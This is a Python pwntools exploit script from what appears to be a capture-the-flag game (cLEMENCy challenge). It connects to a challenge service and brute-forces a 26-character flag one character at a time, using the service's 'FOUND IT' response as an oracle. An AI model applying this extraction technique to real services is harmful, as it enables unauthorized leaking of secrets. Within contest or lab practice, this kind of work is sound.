#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from clemencyasm import asm
from clemency import *
# from pwn import p32,p64,u32,u64,asm

r = None

def exploit(host):
    global r
    port = 13337
    port = 2600
    # r = remote(host, port)
    # r = process(['../../emulator/clemency-emu', 'hello.pwnable'])
    r = remote(host, port)
    r = cyio(r)

    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.recvuntil('\n')
    r.sendline('y')
    flag = ''
    head = 'FETCH '
    t = ''
    for i in xrange(27):
        r.recvuntil('\n')

    blacklist = ['0b', '0m', '00', '01', '03', '05', '06', '07', '09', '1a', '1b', '1m', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '3K', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '47', '48', '5m', '50', '54', '56', '57', '59', '60', '61', '62', '65', '67', '68', '70', '72', '73', '74', '76', '77', '78', '8a', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']

    for i in string.digits:
        found = False
        for j in string.letters + string.digits:
            t = flag + i + j
            if i + j in blacklist:
                continue
            r.sendline(head + t)
            r.recvuntil('\n')
            result = r.recvuntil('\n')
            if 'FOUND IT' in result:
                flag = flag + i + j
                found = True
                break
        if found:
            break

    while True:
        inc = False
        for i in string.letters + string.digits:
            t = i + flag
            r.sendline(head + t)
            r.recvuntil('\n')
            result = r.recvuntil('\n')
            if 'FOUND IT' in result:
                inc = True
                flag = i + flag
                if len(flag) == 26:
                    return flag
                # print flag
                break
        if not inc:
            break

    # print 'haha'

    # try right
    while True:
        inc = False
        for i in string.letters + string.digits:
            t = flag + i
            r.sendline(head + t)
            r.recvuntil('\n')
            result = r.recvuntil('\n')
            if 'FOUND IT' in result:
                inc = True
                flag = flag + i
                if len(flag) == 26:
                    return flag
                # print flag
                break
        if not inc:
            break

if __name__ == '__main__':
    host = '127.0.0.1'
    host = '10.5.10.2'
    print exploit(host)
    # r.interactive()
